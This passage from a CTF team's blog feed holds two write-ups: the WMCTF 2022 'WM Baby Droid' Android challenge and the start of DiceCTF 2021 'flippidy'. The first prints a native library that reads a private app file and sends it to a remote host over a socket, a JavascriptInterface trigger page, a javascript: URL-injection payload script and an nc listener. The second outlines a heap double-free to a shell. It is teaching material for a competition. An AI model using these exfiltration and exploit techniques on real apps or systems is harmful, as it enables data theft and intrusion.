class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wmbabydroid.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jni.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_file_exist</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="function">ifstream <span class="title">infile</span><span class="params">(fileName)</span></span>;</span><br><span class="line">  <span class="keyword">bool</span> r = infile.good();</span><br><span class="line">  infile.close();</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">execute</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> command)</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> sockfd, portno, n;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">server</span>;</span></span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">256</span>] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">      portno = <span class="number">13571</span>;</span><br><span class="line">      sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//if (sockfd &lt; 0)</span></span><br><span class="line">      <span class="comment">//  error("ERROR opening socket");:</span></span><br><span class="line">      server = gethostbyname(<span class="string">"&lt;redacted&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span> (server == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"ERROR, no such host\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      bzero((<span class="keyword">char</span> *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">      serv_addr.sin_family = AF_INET;</span><br><span class="line">      bcopy((<span class="keyword">char</span> *)server-&gt;h_addr,</span><br><span class="line">            (<span class="keyword">char</span> *)&amp;serv_addr.sin_addr.s_addr,</span><br><span class="line">            server-&gt;h_length);</span><br><span class="line">      serv_addr.sin_port = htons(portno);</span><br><span class="line">      <span class="keyword">if</span> (connect(sockfd, (struct sockaddr *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ERROR connecting"</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Please enter the message: "</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file_exist(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        send(sockfd, <span class="string">"File doesn't exist yet\n"</span>, <span class="built_in">strlen</span>(<span class="string">"File doesn't exist yet\n"</span>), <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FILE* fd = fopen(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// loop to extract every characters</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// reading file</span></span><br><span class="line">            <span class="keyword">char</span> c = fgetc(fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// end of file indicator</span></span><br><span class="line">            <span class="keyword">if</span> (feof(fd))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            buffer[i++] = c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// closes the file pointed by demo</span></span><br><span class="line">        fclose(fd);</span><br><span class="line"></span><br><span class="line">      n = send(sockfd, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">char</span>* write_error;</span><br><span class="line">      <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        write_error = strerror(errno);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s"</span>, write_error);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buffer);</span><br><span class="line">      close(sockfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *)</span> </span>&#123;</span><br><span class="line">  JNIEnv *env;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (vm-&gt;GetEnv(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span> **&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">    <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">  &#125;</span><br><span class="line">  Task taskPtr;</span><br><span class="line">  <span class="built_in">std</span>::<span class="function">thread <span class="title">th</span><span class="params">(&amp;Task::execute, taskPtr, <span class="string">"Sample Task"</span>)</span></span>;</span><br><span class="line">  th.join();</span><br><span class="line">  <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We also added this infinite loop to check if the flag file already exists (If the payload is too fast the flag might not be in the directory):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file_exist(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        send(sockfd, <span class="string">"File doesn't exist yet\n"</span>, <span class="built_in">strlen</span>(<span class="string">"File doesn't exist yet\n"</span>), <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p><p>One line command to extract the lib from the built apk:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -p ~/AndroidStudioProjects/&lt;project-name&gt;/app/build/outputs/apk/debug/app-debug.apk lib/x86_64/libwmbabydroid.so &gt; libcargo.so</span><br></pre></td></tr></table></figure></p><p>We followed the google <a href="https://developer.android.com/ndk/guides" target="_blank" rel="noopener">documentation</a> on how to implement native libraries in android.</p><h3 id="Trigger-the-JavascriptInterface-code"><a href="#Trigger-the-JavascriptInterface-code" class="headerlink" title="Trigger the @JavascriptInterface code"></a>Trigger the @JavascriptInterface code</h3><p>Javascript Interfaces allows exposing methods to JavaScript:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">this</span>, <span class="string">"lmao"</span>);</span><br><span class="line">...</span><br><span class="line"><span class="meta">@JavascriptInterface</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lmao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        File so = <span class="keyword">new</span> File(getFilesDir() + <span class="string">"/lmao.so"</span>);</span><br><span class="line">        <span class="keyword">if</span> (so.exists()) &#123;</span><br><span class="line">            System.load(so.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <strong>@JavascriptInterface</strong> notation will allow us to execute java code function from javascript for example to execute the code above we can use:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">javaInterface</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    lmao.lmao();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To trigger the download and the JavascriptInterface we created the following html file:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"getAll()"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;iframe src="/download"&gt;&lt;/iframe&gt;--&gt;</span></span><br><span class="line">        </span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/download"</span> <span class="attr">id</span>=<span class="string">"test"</span> &gt;</span>qweqwe<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getAll</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">        lmao.lmao();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//download();</span></span></span><br><span class="line"><span class="undefined">        setTimeout(download, 3000);</span></span><br><span class="line"><span class="undefined">        setTimeout(timeoutFunc, 15000);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).click();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">timeoutFunc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">            lmao.lmao();</span></span><br><span class="line"><span class="undefined">        &#125;   </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>Note that running <strong>lmao.lmao()</strong> first is very important since the <strong>files</strong> directory is not created when the apk is installed. </p><p>The method <strong>getFilesDir()</strong> will create the directory for us:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File so = <span class="keyword">new</span> File(getFilesDir() + <span class="string">"/lmao.so"</span>);</span><br></pre></td></tr></table></figure><h3 id="Final-script"><a href="#Final-script" class="headerlink" title="Final script"></a>Final script</h3><p>Using pwntools to send the link to the app in the server<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    r = remote(<span class="string">'localhost'</span>, <span class="number">10086</span>) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(</span><br><span class="line">        <span class="string">'43.248.96.7'</span>, <span class="number">10086</span>)</span><br><span class="line">    a = r.recvuntil(<span class="string">b"Please enter the xxxx to satisfy the above equation:\n"</span>)</span><br><span class="line">    begin, end, hash_digest = re.findall(</span><br><span class="line">        <span class="string">r'(?&lt;=")[a-zA-Z0-9]+?(?=")'</span>, a.decode())</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">                    test_hash = hashlib.sha256(</span><br><span class="line">                        (begin+a+b+c+d).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> test_hash == hash_digest:</span><br><span class="line">                        print(a+b+c+d)</span><br><span class="line">                        r.sendline((a+b+c+d).encode())</span><br><span class="line">                        r.recvuntil(<span class="string">b'Please enter your poc url:\n'</span>)</span><br><span class="line">                        r.sendline(</span><br><span class="line">                            <span class="string">"JavaScript://www.google.com/%0d%0awindow.location.href='&#123;&#125;'"</span>.format(args.HOST).encode())</span><br><span class="line">                        print(r.recvuntil(<span class="string">b'exiting......\n'</span>, timeout=<span class="number">60</span>*<span class="number">5</span>))</span><br><span class="line">                        r.close()</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.LOOP:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python wm_baby_droid.py REMOTE LOOP HOST=https://wmctf2022.herokuapp.com</span><br><span class="line">[+] Opening connection to 43.248.96.7 on port 10086: Done</span><br><span class="line">xthO</span><br><span class="line">b<span class="string">'Preparing android emulator. This may takes about 2 minutes...\n\nLaunching! Let your apk fly for a while...\n\nexiting......\n'</span></span><br><span class="line">[*] Closed connection to 43.248.96.7 port 10086</span><br><span class="line">[+] Opening connection to 43.248.96.7 on port 10086: Done</span><br><span class="line">xsEK</span><br><span class="line">[*] Closed connection to 43.248.96.7 port 10086</span><br></pre></td></tr></table></figure><p>Receiving the flag on our listening service:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l -k  5000</span><br><span class="line">WMCTF&#123;e0230a12-fa8d-443a-959a-bb61d24e5132&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>WMCTF{e0230a12-fa8d-443a-959a-bb61d24e5132}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt; WM Baby Droid &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Solves&lt;/strong&gt;: 1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 500   &lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="Android" scheme="https://teamrocketist.github.io/categories/Pwn/Android/"/>
    
    
      <category term="android" scheme="https://teamrocketist.github.io/tags/android/"/>
    
      <category term="adb" scheme="https://teamrocketist.github.io/tags/adb/"/>
    
      <category term="javascriptinterfaces" scheme="https://teamrocketist.github.io/tags/javascriptinterfaces/"/>
    
      <category term="nativelibraries" scheme="https://teamrocketist.github.io/tags/nativelibraries/"/>
    
      <category term="emulator" scheme="https://teamrocketist.github.io/tags/emulator/"/>
    
      <category term="gethost" scheme="https://teamrocketist.github.io/tags/gethost/"/>
    
      <category term="uri" scheme="https://teamrocketist.github.io/tags/uri/"/>
    
      <category term="urigethost" scheme="https://teamrocketist.github.io/tags/urigethost/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] DiceCTF2021 - flippidy</title>
    <link href="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/"/>
    <id>https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/</id>
    <published>2021-02-08T06:03:26.000Z</published>
    <updated>2022-08-23T04:34:08.813Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>flippidy</p></blockquote><blockquote><p><strong>Solves</strong>: 62</p><p><strong>Points</strong>: 149   </p><p><strong>Description</strong>:<br>See if you can flip this program into a flag :D</p><p>nc dicec.tf 31904</p><p><a href="https://mega.nz/file/6r4wXBDL#mBW146qJFxJkSH0S9d88CgrlXBrlcFwr5-EnhC6lOg4" target="_blank" rel="noopener">flippidy</a><br>45ffbb615d868486383a07220e6e6bfc</p><p><a href="https://mega.nz/file/qnhiyZbY#ysipLkhsy6-f3dgR44_2YAk7owxTm_aN4TloGrVYoZ8" target="_blank" rel="noopener">libc.so.6</a><br>50390b2ae8aaa73c47745040f54e602f</p><p><strong>Author</strong>: joshdabosh</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Set the limit of notes to 1.</li><li>Alloc a new note with the global <code>0x404020</code>.</li><li>Running flip will trigger a double free and poison the next pointer of tchachebin[0x40] to <code>0x404020</code>.</li><li>Next malloc will write to <code>0x404020</code> which is where is located the pointer of the strings of the menu.  </li><li>Change this pointers to a <code>GOT[&#39;fgets&#39;]</code> to get a leak, at the same time we can corrupt the pointer at <code>0x404040</code> to <code>0x404158</code>. </li><li><code>0x404158</code> is the address of the first entry of the note list having the control of this will give us arbitrary write at our control.</li><li>Change the pointer at <code>0x404158</code> to free_hook and set it to <code>one_gadget</code>.</li><li>Trigger free with <code>flip function</code> to get a shell.</li></ul><h3 id="Information-extraction"><a href="#Information-extraction" class="headerlink" title="Information extraction"></a>Information extraction</h3><p>File<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file flippidy</span><br><span class="line">flippidy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bad92d378d5af68a52fd2856145dc8588533a25, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure></p><p>Security<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=flippidy</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols     FORTIFY Fortified   Fortifiable FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols    No    0       4       flippidy</span><br></pre></td></tr></table></figure></p><h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><h4 id="Main-function"><a href="#Main-function" class="headerlink" title="Main function"></a>Main function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_401211();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"To get started, first tell us how big your notebook will be: "</span>);</span><br><span class="line">  firstRead_404150 = sub_401254();</span><br><span class="line">  qword_404158 = <span class="built_in">malloc</span>(<span class="number">8</span> * firstRead_404150);</span><br><span class="line">  <span class="built_in">memset</span>(qword_404158, <span class="number">0</span>, <span class="number">8</span> * firstRead_404150);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011C6();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": "</span>);</span><br><span class="line">    v3 = sub_401254();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Goodbye!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_4012D0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      flip_401378();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The main function asks for the size of the note list, the size of the list is stored at <code>0x404150</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 